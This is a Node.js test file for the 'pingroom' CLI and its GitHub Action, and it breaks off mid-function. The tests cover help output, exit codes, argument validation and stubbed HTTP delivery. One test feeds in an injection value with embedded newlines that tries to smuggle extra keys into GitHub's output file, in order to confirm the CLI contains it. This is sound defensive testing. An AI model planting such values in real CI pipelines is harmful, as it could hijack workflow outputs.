import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { dirname, join } from 'node:path';
import { chmodSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';

const __dirname = dirname(fileURLToPath(import.meta.url));
const CLI = join(__dirname, '..', 'bin', 'pingroom.js');

test('GitHub Action forwards acknowledgement inputs to the CLI', () => {
  const action = readFileSync(join(__dirname, '..', 'action.yml'), 'utf8');
  assert.match(action, /^  require-ack:/m);
  assert.match(action, /^  ack-timeout:/m);
  assert.match(action, /args\+=\(--require-ack\)/);
  assert.match(action, /args\+=\(--ack-timeout "\$PR_ACK_TIMEOUT"\)/);
});

test('GitHub Action exposes handoff inputs and outputs', () => {
  const action = readFileSync(join(__dirname, '..', 'action.yml'), 'utf8');
  // Handoff inputs
  assert.match(action, /^  handoff:/m);
  assert.match(action, /^  question:/m);
  assert.match(action, /^  options:/m);
  assert.match(action, /^  idempotency-key:/m);
  assert.match(action, /^  target:/m);
  assert.match(action, /^  expires-in:/m);
  assert.match(action, /^  wait:/m);
  // Outputs
  assert.match(action, /^outputs:/m);
  assert.match(action, /^  handoff-id:/m);
  assert.match(action, /^  state:/m);
  assert.match(action, /^  acknowledged-by:/m);
  assert.match(action, /^  answer:/m);
  assert.match(action, /^  delivery-state:/m);
  // The CLI owns GitHub's output-file protocol; the shell never interprets
  // untrusted answer stdout as output commands.
  assert.match(action, /args=\(handoff -m "\$PR_MESSAGE"\)/);
  assert.match(action, /Idempotency-Key/i);
  assert.match(action, /--github-output "\$GITHUB_OUTPUT"/);
  assert.doesNotMatch(action, /while IFS=['"]?=['"]? read/);
  assert.doesNotMatch(action, />>\s*"\$GITHUB_OUTPUT"/);
  assert.match(action, /exit \$code/);
  assert.match(action, /@pingroom\/cli@\d+\.\d+\.\d+/);
});

test('GitHub Action exposes ask inputs and outputs through the same output protocol', () => {
  const action = readFileSync(join(__dirname, '..', 'action.yml'), 'utf8');
  // Inputs
  assert.match(action, /^  ask:/m);
  assert.match(action, /^  context:/m);
  assert.match(action, /^  timeout:/m);
  assert.match(action, /^  api:/m);
  // The API override rides an env var, not a flag, so it applies to every mode.
  assert.match(action, /^        PINGROOM_API_URL: \$\{\{ inputs\.api \}\}$/m);
  assert.doesNotMatch(action, /args\+=\(--api /);
  // Output
  assert.match(action, /^  question-id:/m);
  // The ask branch must be reachable — i.e. come before the unconditional ping
  // fallback — and reuse the shared splitter and the CLI-owned output file.
  assert.match(action, /if \[ "\$PR_ASK" = "true" \]; then/);
  assert.match(action, /args=\(ask -p "\$PR_MESSAGE" --room "\$PR_ROOM"\)/);
  assert.ok(
    action.indexOf('args=(ask -p "$PR_MESSAGE"') < action.indexOf('args=(ping -m "$PR_MESSAGE")'),
    'the ask branch must precede the ping fallback',
  );
  assert.match(action, /args\+=\(-c "\$PR_CONTEXT"\)/);
  assert.match(action, /args\+=\(--timeout "\$PR_TIMEOUT"\)/);
  // Two branches, two re-raised exit codes, plus the ping fallback's own path.
  assert.equal(action.match(/--github-output "\$GITHUB_OUTPUT"/g).length, 2);
  assert.equal(action.match(/exit \$code/g).length, 2);
});

test('GitHub Action splits options on newlines first so a label may contain a comma', () => {
  const action = readFileSync(join(__dirname, '..', 'action.yml'), 'utf8');
  // One shared splitter, used by every branch that forwards options.
  assert.match(action, /^        split_options\(\) \{$/m);
  // Newline-primary guard: a value containing a newline is never run through
  // `tr ',' '\n'`, which used to shred "ship:Ship it, now" into two options.
  assert.match(action, /if \[ "\$\{raw#\*\$'\\n'\}" != "\$raw" \]; then/);
  assert.match(action, /for opt in "\$\{PR_OPTS\[@\]\}"; do args\+=\(-o "\$opt"\); done/);
  // The comma fallback survives, but only for single-line input.
  assert.match(action, /tr ',' '\\n'/);
  // The input documents the newline form as the one that supports commas.
  assert.match(action, /one per line \(preferred\)/);
});

// Release policy: package.json is the single source of the version — bin/ reads
// it at startup — so no test hardcodes a literal. The Action's `npx` pin must be
// bumped in the SAME COMMIT as package.json, and the lockfile bumped with it.
test('source versions align while the GitHub Action stays on the published release', () => {
  const pkg = JSON.parse(readFileSync(join(__dirname, '..', 'package.json'), 'utf8'));
  const lock = JSON.parse(readFileSync(join(__dirname, '..', 'package-lock.json'), 'utf8'));
  const action = readFileSync(join(__dirname, '..', 'action.yml'), 'utf8');
  assert.match(pkg.version, /^\d+\.\d+\.\d+$/);
  assert.equal(lock.version, pkg.version);
  assert.equal(lock.packages[''].version, pkg.version);
  // The Action must pin the concrete, clean-install-verified npm release, never
  // a range or `latest` — and the same one this source tree declares.
  const pinned = action.match(/@pingroom\/cli@(\d+\.\d+\.\d+)/)?.[1];
  assert.equal(pinned, pkg.version);
});

test('the published tarball carries every directory the entry point imports', () => {
  const pkg = JSON.parse(readFileSync(join(__dirname, '..', 'package.json'), 'utf8'));
  // A tarball missing `lib` installs a bin/ that cannot resolve its own imports,
  // which only shows up after publish. Fail here instead.
  assert.ok(pkg.files.includes('bin'), 'package.json files must include bin');
  assert.ok(pkg.files.includes('lib'), 'package.json files must include lib');
});

/**
 * Run the CLI as a real subprocess and capture its exit code + streams.
 * Pass `env` overrides for credential/endpoint config. PINGROOM_* env vars
 * are stripped by default so the host machine's config can't leak in.
 */
// A throwaway PINGROOM_HOME shared by every run that doesn't ask for its own,
// so the developer's real ~/.pingroom (paired credential, default_room) can
// never change what a test sees.
const EMPTY_HOME = mkdtempSync(join(tmpdir(), 'pingroom-empty-'));

/** Strip every PINGROOM_* input and pin the local state at an empty directory. */
function baseEnv() {
  const cleanEnv = { ...process.env };
  delete cleanEnv.PINGROOM_WEBHOOK_URL;
  delete cleanEnv.PINGROOM_TOKEN;
  delete cleanEnv.PINGROOM_API_URL;
  delete cleanEnv.PINGROOM_ROOM;
  delete cleanEnv.PINGROOM_INTERNAL_TEST_TTY;
  delete cleanEnv.PINGROOM_INTERNAL_ACTIVATION_TIMEOUT_MS;
  delete cleanEnv.NODE_ENV;
  cleanEnv.PINGROOM_HOME = EMPTY_HOME;
  return cleanEnv;
}

function run(args, env = {}) {
  const r = spawnSync(process.execPath, [CLI, ...args], {
    env: { ...baseEnv(), ...env },
    encoding: 'utf8',
  });
  return { status: r.status, stdout: r.stdout, stderr: r.stderr };
}

/**
 * Async variant for tests that need an in-process stub server: spawnSync would
 * block the event loop and deadlock against a localhost server running in the
 * same process, so use async spawn and resolve on close.
 *
 * `stdin` feeds the interactive prompts (the connect picker, email, OTP); it is
 * written as one blob and the pipe is closed, which is enough because every
 * prompt is answered in order.
 *
 * `timeoutMs` kills the child and reports `timedOut`. Tests that assert a loop
 * terminates need it: without a kill, a regression that reintroduces the loop
 * hangs the whole suite instead of failing one test.
 *
 * `execPath` / `execArgs` let a test start node differently (a umask wrapper, a
 * --import preload) while keeping the same env scrubbing and capture.
 */
function runAsync(args, env = {}, { stdin, timeoutMs, execPath, execArgs = [] } = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(execPath ?? process.execPath, [...execArgs, CLI, ...args], {
      env: { ...baseEnv(), ...env },
    });
    let stdout = '';
    let stderr = '';
    let timedOut = false;
    const timer = timeoutMs
      ? setTimeout(() => { timedOut = true; child.kill('SIGKILL'); }, timeoutMs)
      : null;
    child.stdout.on('data', (c) => (stdout += c));
    child.stderr.on('data', (c) => (stderr += c));
    child.on('error', (err) => { if (timer) clearTimeout(timer); reject(err); });
    child.on('close', (status) => {
      if (timer) clearTimeout(timer);
      resolve({ status, stdout, stderr, timedOut });
    });
    if (stdin !== undefined) child.stdin.write(stdin);
    child.stdin.end();
  });
}

/** Start a one-shot localhost stub server. Resolves once it's listening. */
function startServer(handler) {
  return new Promise((resolve) => {
    const server = createServer(handler);
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      resolve({ server, baseUrl: `http://127.0.0.1:${port}` });
    });
  });
}

// ---------------------------------------------------------------------------
// Exit 0 — help / no-command
// ---------------------------------------------------------------------------

test('exit 0: no command prints help', () => {
  const { status, stdout } = run([]);
  assert.equal(status, 0);
  assert.match(stdout, /pingroom — send a ping/);
});

test('exit 0: --help prints help', () => {
  const { status, stdout } = run(['--help']);
  assert.equal(status, 0);
  assert.match(stdout, /Exit codes: 0 on success/);
});

test('exit 0: -h prints help', () => {
  const { status } = run(['-h']);
  assert.equal(status, 0);
});

test('exit 0: "help" command prints help', () => {
  const { status, stdout } = run(['help']);
  assert.equal(status, 0);
  assert.match(stdout, /Usage:/);
});

test('exit 0: --version and -v print the package version', () => {
  const pkg = JSON.parse(readFileSync(join(__dirname, '..', 'package.json'), 'utf8'));
  for (const flag of ['--version', '-v']) {
    const { status, stdout, stderr } = run([flag]);
    assert.equal(status, 0);
    assert.equal(stdout, `${pkg.version}\n`);
    assert.equal(stderr, '');
  }
});

test('mcp prints the canonical endpoint and copy-ready client setup', () => {
  const { status, stdout, stderr } = run(['mcp']);
  assert.equal(status, 0);
  assert.equal(stderr, '');
  assert.match(stdout, /https:\/\/api\.pingroom\.io\/api\/agent\/mcp/);
  assert.match(stdout, /claude mcp add --transport http pingroom https:\/\/api\.pingroom\.io\/api\/agent\/mcp/);
  assert.match(stdout, /"mcpServers"/);
  assert.match(stdout, /"pingroom": \{/);
  assert.match(stdout, /"url": "https:\/\/api\.pingroom\.io\/api\/agent\/mcp"/);
  assert.match(stdout, /Claude Desktop:/);
  assert.match(stdout, /Add custom connector/);
  assert.match(stdout, /does not modify client config/);
});

test('mcp add claude-code remains safe and output-only', () => {
  const { status, stdout, stderr } = run(['mcp', 'add', 'claude-code']);
  assert.equal(status, 0);
  assert.equal(stderr, '');
  assert.match(stdout, /No client configuration was changed/);
  assert.match(stdout, /claude mcp add --transport http pingroom https:\/\/api\.pingroom\.io\/api\/agent\/mcp/);
});

test('exit 0: ping -h prints the ping-focused help, not the full reference', () => {
  // `ping -h` routes through parseArgs -> args.help -> ping() returns 0, and
  // prints only the ping section plus the shared flags footer.
  const { status, stdout } = run(['ping', '-h']);
  assert.equal(status, 0);
  assert.match(stdout, /^ping options:/);
  assert.match(stdout, /-m, --message <text>/);
  assert.match(stdout, /Shared:/);
  assert.doesNotMatch(stdout, /pingroom — send a ping/);
  assert.doesNotMatch(stdout, /ask options/);
  assert.doesNotMatch(stdout, /Exit codes: 0 on success/);
});

test('exit 0: ask --help prints the ask section plus the shared flags', () => {
  const { status, stdout } = run(['ask', '--help']);
  assert.equal(status, 0);
  assert.match(stdout, /^ask options \(agent token required\):/);
  assert.match(stdout, /-p, --prompt <text>/);
  assert.match(stdout, /--token <token>/);
  assert.doesNotMatch(stdout, /ping options:/);
  assert.doesNotMatch(stdout, /Connecting:/);
});

test('exit 0: live --help prints the live section (previously exit 2)', () => {
  // Before per-command help, `live -h` failed with "live needs a subcommand"
  // and `live start -h` silently ignored the flag.
  for (const argv of [['live', '--help'], ['live', '-h'], ['live', 'start', '-h']]) {
    const { status, stdout, stderr } = run(argv);
    assert.equal(status, 0, stderr);
    assert.match(stdout, /^live <start\|update\|end\|get> options/);
    assert.doesNotMatch(stdout, /hook options/);
  }
});

test('exit 0: logout --help prints its focused help without flags it rejects', () => {
  const { status, stdout } = run(['logout', '--help']);
  assert.equal(status, 0);
  assert.match(stdout, /^logout:/);
  assert.match(stdout, /-h, --help/);
  // logout rejects --token/--api/--json, so its help must not advertise them.
  assert.doesNotMatch(stdout, /--token/);
  assert.doesNotMatch(stdout, /--json/);
});

// ---------------------------------------------------------------------------
// Exit 2 — bad usage
// ---------------------------------------------------------------------------

test('exit 2: unknown command', () => {
  const { status, stderr } = run(['frobnicate']);
  assert.equal(status, 2);
  assert.match(stderr, /unknown command: frobnicate/);
});

test('exit 2: unknown option', () => {
  const { status, stderr } = run(['ping', '--bogus', 'x']);
  assert.equal(status, 2);
  assert.match(stderr, /Unknown option: --bogus/);
});

test('exit 2: missing --message', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook']);
  assert.equal(status, 2);
  assert.match(stderr, /--message is required/);
});

test('exit 2: bad --action (out of range)', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '-a', '7']);
  assert.equal(status, 2);
  assert.match(stderr, /--action must be an integer/);
});

test('exit 2: bad --action (non-numeric)', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '-a', 'foo']);
  assert.equal(status, 2);
  assert.match(stderr, /--action must be an integer/);
});

test('exit 2: invalid --data JSON', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '-d', '{not json}']);
  assert.equal(status, 2);
  assert.match(stderr, /--data must be valid JSON/);
});

test('exit 2: --data is valid JSON but not an object', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '-d', '[1,2,3]']);
  assert.equal(status, 2);
  assert.match(stderr, /--data must be a JSON object/);
});

test('exit 2: --ack-timeout requires --require-ack', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--ack-timeout', '120']);
  assert.equal(status, 2);
  assert.match(stderr, /--ack-timeout requires --require-ack/);
});

test('exit 2: --ack-timeout needs a value', () => {
  const { status, stderr } = run([
    'ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--require-ack', '--ack-timeout',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /option --ack-timeout needs a value/);
});

test('exit 2: webhook --ack-timeout must be within 1–86400 seconds', () => {
  const { status, stderr } = run([
    'ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--require-ack', '--ack-timeout', '0',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /between 1 and 86400/);
});

test('exit 2: agent room --ack-timeout must be within 60–86400 seconds', () => {
  const { status, stderr } = run([
    'ping', '--token', 'tok', '--room', 'ab12cd', '--api', 'http://127.0.0.1:1',
    '-m', 'hi', '--require-ack', '--ack-timeout', '30',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /between 60 and 86400/);
});

test('exit 2: --button-label requires --url', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--button-label', 'Open']);
  assert.equal(status, 2);
  assert.match(stderr, /--button-label requires --url/);
});

test('exit 2: --url must be a valid absolute URL', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--url', '/relative/path']);
  assert.equal(status, 2);
  assert.match(stderr, /--url is not a valid URL/);
});

test('exit 2: --url must be http(s)', () => {
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi', '--url', 'ftp://example.com/x']);
  assert.equal(status, 2);
  assert.match(stderr, /--url must be an absolute http\(s\) URL/);
});

test('exit 2: --button-label over 26 chars', () => {
  const { status, stderr } = run([
    'ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi',
    '--url', 'https://example.com', '--button-label', 'x'.repeat(27),
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /--button-label must be at most 26 characters/);
});

test('exit 2: --token without --room', () => {
  const { status, stderr } = run(['ping', '--token', 'tok_abc', '-m', 'hi']);
  assert.equal(status, 2);
  assert.match(stderr, /--room is required/);
});

test('exit 2: no credential (no webhook, no token)', () => {
  const { status, stderr } = run(['ping', '-m', 'hi']);
  assert.equal(status, 2);
  assert.match(stderr, /provide a webhook .* or an agent token/);
});

// ---------------------------------------------------------------------------
// Exit 0 — successful delivery (stubbed server)
// ---------------------------------------------------------------------------

test('exit 0: successful webhook delivery', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ method: req.method, url: req.url, body });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    });
  });
  try {
    const { status, stdout } = await runAsync([
      'ping', '-w', `${baseUrl}/hook`, '-m', 'hello', '--require-ack', '--ack-timeout', '45',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /ping sent/);
    assert.equal(received.length, 1);
    assert.equal(received[0].method, 'POST');
    assert.deepEqual(JSON.parse(received[0].body), {
      message: 'hello', requires_ack: true, ack_timeout_seconds: 45,
    });
  } finally {
    server.close();
  }
});

test('exit 0: link ping folds --url/--button-label into data', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ body });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true }));
    });
  });
  try {
    const { status } = await runAsync([
      'ping', '-w', `${baseUrl}/hook`, '-m', 'build ready',
      '-d', '{"commit":"abc123"}',
      '--url', 'https://ci.example.com/b/512', '--button-label', 'Open build',
    ]);
    assert.equal(status, 0);
    assert.deepEqual(JSON.parse(received[0].body), {
      message: 'build ready',
      data: { commit: 'abc123', url: 'https://ci.example.com/b/512', button_label: 'Open build' },
    });
  } finally {
    server.close();
  }
});

test('exit 0: successful agent-token delivery via --api override', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ url: req.url, auth: req.headers['authorization'], body });
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ id: 'n1' }));
    });
  });
  try {
    const { status, stdout } = await runAsync([
      'ping', '--token', 'tok_abc', '--room', 'ab12cd', '--api', baseUrl,
      '-m', 'shipped', '-t', 'CI', '-a', '2', '-d', '{"version":"1.4.0"}',
      '--require-ack', '--ack-timeout', '300',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /ping sent/);
    assert.equal(received[0].url, '/api/agent/rooms/ab12cd/notifications');
    assert.equal(received[0].auth, 'Bearer tok_abc');
    assert.deepEqual(JSON.parse(received[0].body), {
      message: 'shipped', title: 'CI', action_number: 2, data: { version: '1.4.0' },
      requires_ack: true, ack_timeout_seconds: 300,
    });
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// Exit 1 — delivery failure
// ---------------------------------------------------------------------------

test('exit 1: HTTP error response from server', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    res.writeHead(500, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ message: 'boom' }));
  });
  try {
    const { status, stderr } = await runAsync(['ping', '-w', `${baseUrl}/hook`, '-m', 'hi']);
    assert.equal(status, 1);
    assert.match(stderr, /delivery failed: boom/);
  } finally {
    server.close();
  }
});

test('exit 1: 200 OK but success:false in body', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: false, error: 'rejected' }));
  });
  try {
    const { status, stderr } = await runAsync(['ping', '-w', `${baseUrl}/hook`, '-m', 'hi']);
    assert.equal(status, 1);
    assert.match(stderr, /delivery failed: rejected/);
  } finally {
    server.close();
  }
});

test('exit 1: network error (connection refused)', () => {
  // Port 1 is privileged/unused -> fetch throws -> fail() defaults to code 1.
  const { status, stderr } = run(['ping', '-w', 'http://127.0.0.1:1/hook', '-m', 'hi']);
  assert.equal(status, 1);
  assert.match(stderr, /network error/);
});

// ---------------------------------------------------------------------------
// Questions — ask / watch / list / cancel
// ---------------------------------------------------------------------------

/** Route a stub server by "METHOD /pathname". Each handler returns { status, body }. */
function questionServer(routes) {
  const received = [];
  return startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      const path = req.url.split('?')[0];
      received.push({ method: req.method, path, query: req.url.split('?')[1] ?? '', auth: req.headers['authorization'], body });
      const handler = routes[`${req.method} ${path}`];
      const out = handler ? handler(body) : { status: 404, body: { message: 'no route' } };
      res.writeHead(out.status ?? 200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(out.body ?? {}));
    });
  }).then((s) => ({ ...s, received }));
}

test('exit 2: ask without --prompt', () => {
  const { status, stderr } = run(['ask', '--token', 't', '--room', 'ab12cd']);
  assert.equal(status, 2);
  assert.match(stderr, /--prompt is required/);
});

test('exit 2: ask without a token', () => {
  const { status, stderr } = run(['ask', '--room', 'ab12cd', '-p', 'Deploy?']);
  assert.equal(status, 2);
  assert.match(stderr, /agent token is required/);
});

test('exit 2: ask without --room', () => {
  const { status, stderr } = run(['ask', '--token', 't', '-p', 'Deploy?']);
  assert.equal(status, 2);
  assert.match(stderr, /--room is required/);
});

test('exit 2: watch without an id', () => {
  const { status, stderr } = run(['watch', '--token', 't']);
  assert.equal(status, 2);
  assert.match(stderr, /question id is required/);
});

test('the "await" alias for watch is dispatched, documented, and shares its help', () => {
  // The alias existed in the dispatch table but nothing advertised it, so the
  // only way to find it was reading the source.
  const help = run(['--help']);
  assert.equal(help.status, 0);
  assert.match(help.stdout, /alias: await/);

  const missingId = run(['await', '--token', 't']);
  assert.equal(missingId.status, 2);
  assert.match(missingId.stderr, /question id is required/);

  const aliasHelp = run(['await', '--help']);
  assert.equal(aliasHelp.status, 0);
  assert.equal(aliasHelp.stdout, run(['watch', '--help']).stdout);
  assert.match(aliasHelp.stdout, /^watch:/);
});

test('exit 2: bad --scope', () => {
  const { status, stderr } = run(['ask', '--token', 't', '--room', 'ab12cd', '-p', 'x', '--scope', 'sideways']);
  assert.equal(status, 2);
  assert.match(stderr, /--scope must be/);
});

test('exit 2: bad --text-max', () => {
  const { status, stderr } = run([
    'ask', '--token', 't', '--room', 'ab12cd', '-p', 'x',
    '--text-input', 'Why?', '--text-max', 'lots',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /--text-max must be an integer/);
});

test('exit 2: --text-max out of range', () => {
  const { status, stderr } = run([
    'ask', '--token', 't', '--room', 'ab12cd', '-p', 'x', '--text-max', '61',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /--text-max must be an integer/);
});

test('ask (no --wait) creates the question and prints its id', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_1', state: 'pending' } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '-p', 'Which env?', '-o', 'prod:Production', '-o', 'staging:Staging', '--scope', 'room',
    ]);
    assert.equal(status, 0);
    assert.equal(stdout.trim(), 'q_1');
    assert.equal(received[0].auth, 'Bearer tok');
    assert.deepEqual(JSON.parse(received[0].body), {
      prompt: 'Which env?',
      options: [{ value: 'prod', label: 'Production' }, { value: 'staging', label: 'Staging' }],
      responder_scope: 'room',
    });
  } finally {
    server.close();
  }
});

test('ask serializes option styles, text_input, and reply_to', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_s', state: 'pending' } }),
  });
  try {
    const { status } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '-p', 'Roll back?',
      '-o', 'yes:Roll back:danger', '-o', 'no:Keep it',
      '--text-input', 'Why?', '--text-max', '40',
      '--reply-to', 'ping_9',
    ]);
    assert.equal(status, 0);
    assert.deepEqual(JSON.parse(received[0].body), {
      prompt: 'Roll back?',
      options: [
        { value: 'yes', label: 'Roll back', style: 'danger' },
        { value: 'no', label: 'Keep it' },
      ],
      reply_to: 'ping_9',
      text_input: { placeholder: 'Why?', max_length: 40 },
    });
  } finally {
    server.close();
  }
});

test('ask --wait blocks and prints the chosen value with exit 0', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_2', state: 'pending' } }),
    'GET /api/agent/questions/q_2/wait': () => ({ status: 200, body: { id: 'q_2', state: 'answered', answer: { value: 'approve', label: 'Approve' } } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl, '--wait', '-p', 'Deploy?',
    ]);
    assert.equal(status, 0);
    assert.equal(stdout.trim(), 'approve');
  } finally {
    server.close();
  }
});

test('ask --wait --json prints the terminal response as JSON', async () => {
  const terminal = { id: 'q_json', state: 'answered', answer: { value: 'approve', label: 'Approve' } };
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_json', state: 'pending' } }),
    'GET /api/agent/questions/q_json/wait': () => ({ status: 200, body: terminal }),
  });
  try {
    const { status, stdout, stderr } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '--wait', '--json', '-p', 'Deploy?',
    ]);
    assert.equal(status, 0, stderr);
    assert.deepEqual(JSON.parse(stdout), terminal);
  } finally {
    server.close();
  }
});

test('ask --wait exits 3 on expiry', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_3', state: 'pending' } }),
    'GET /api/agent/questions/q_3/wait': () => ({ status: 200, body: { id: 'q_3', state: 'expired', answer: null } }),
  });
  try {
    const { status, stdout, stderr } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl, '--wait', '-p', 'Deploy?',
    ]);
    assert.equal(status, 3);
    assert.equal(stdout.trim(), '');
    assert.match(stderr, /question expired/);
  } finally {
    server.close();
  }
});

test('ask --github-output writes the answered question through the delimiter protocol', async () => {
  // The same containment the handoff path has: an answer that looks like output
  // commands must land as one value, never as extra keys.
  const maliciousAnswer = 'approve\nstate=answered\r\nquestion-id=owned\nEOF_like';
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({
      status: 201,
      body: { id: 'q_gh', state: 'pending' },
    }),
    'GET /api/agent/questions/q_gh/wait': () => ({
      status: 200,
      body: { id: 'q_gh', state: 'answered', answer: { value: maliciousAnswer, label: 'Untrusted' } },
    }),
  });
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-cli-ask-output-'));
  const outputPath = join(dir, 'github-output');
  try {
    const { status, stdout, stderr } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl, '--wait',
      '--github-output', outputPath, '-p', 'Deploy?', '-o', 'approve:Approve', '-o', 'hold:Hold',
    ]);
    assert.equal(status, 0, stderr);
    // The stdout contract for `$(pingroom ask --wait ...)` is unchanged.
    assert.equal(stdout, `${maliciousAnswer}\n`);

    const raw = readFileSync(outputPath, 'utf8');
    assert.match(raw, /^question-id<<pingroom_[0-9a-f]{48}$/m);
    const outputs = parseGitHubOutputFile(raw);
    assert.deepEqual(Object.keys(outputs).sort(), ['answer', 'question-id', 'state']);
    assert.equal(outputs['question-id'], 'q_gh');
    assert.equal(outputs.state, 'answered');
    assert.equal(outputs.answer, maliciousAnswer);
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('ask --github-output without --wait reports state=pending and no answer', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({
      status: 201,
      body: { id: 'q_nowait', state: 'pending' },
    }),
  });
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-cli-ask-pending-'));
  const outputPath = join(dir, 'github-output');
  try {
    const { status, stdout, stderr } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '--github-output', outputPath, '-p', 'Deploy?',
    ]);
    assert.equal(status, 0, stderr);
    assert.equal(stdout.trim(), 'q_nowait');

    const outputs = parseGitHubOutputFile(readFileSync(outputPath, 'utf8'));
    // `answer` must be absent, not empty: an unanswered question has no answer.
    assert.deepEqual(Object.keys(outputs).sort(), ['question-id', 'state']);
    assert.equal(outputs['question-id'], 'q_nowait');
    assert.equal(outputs.state, 'pending');
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('exit 2: ask --github-output rejects an empty path instead of silently dropping outputs', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_x', state: 'pending' } }),
  });
  try {
    const { status, stderr } = await runAsync([
      'ask', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '--github-output', '', '-p', 'Deploy?',
    ]);
    assert.equal(status, 2);
    assert.match(stderr, /--github-output must be a non-empty path/);
    assert.equal(received.length, 1);
  } finally {
    server.close();
  }
});

test('list prints a row per question', async () => {
  const { server, baseUrl, received } = await questionServer({
    'GET /api/agent/questions': () => ({ status: 200, body: { questions: [
      { id: 'q_1', state: 'answered', prompt: 'Deploy?', answer: { value: 'approve' } },
      { id: 'q_2', state: 'pending', prompt: 'Merge?', answer: null },
    ] } }),
  });
  try {
    const { status, stdout } = await runAsync(['list', '--token', 'tok', '--api', baseUrl, '--state', 'all']);
    assert.equal(status, 0);
    assert.match(stdout, /q_1\s+answered\s+Deploy\? → approve/);
    assert.match(stdout, /q_2\s+pending\s+Merge\?/);
    assert.match(received[0].query, /state=all/);
  } finally {
    server.close();
  }
});

test('cancel withdraws a pending question', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/questions/q_9/cancel': () => ({ status: 200, body: { id: 'q_9', state: 'cancelled' } }),
  });
  try {
    const { status, stdout } = await runAsync(['cancel', '--token', 'tok', '--api', baseUrl, 'q_9']);
    assert.equal(status, 0);
    assert.match(stdout, /cancelled \(cancelled\)/);
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// handoff
// ---------------------------------------------------------------------------

function parseGitHubOutputFile(raw) {
  const lines = raw.split('\n');
  const outputs = {};
  for (let i = 0; i < lines.length;) {
    if (lines[i] === '') {
      i += 1;
      continue;
    }
